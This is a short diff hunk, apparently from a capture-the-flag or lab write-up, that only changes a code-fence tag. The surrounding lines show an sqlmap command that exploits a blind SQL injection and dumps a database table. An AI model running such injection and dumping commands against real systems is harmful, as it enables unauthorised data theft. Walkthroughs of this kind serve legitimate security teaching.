@@ -223,7 +223,7 @@ search=1
 
 Then run `sqlmap` on that request:
 
-```
+```terminal
 sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
 ```
 `sqlmap` will detect it's a blind SQL injection:
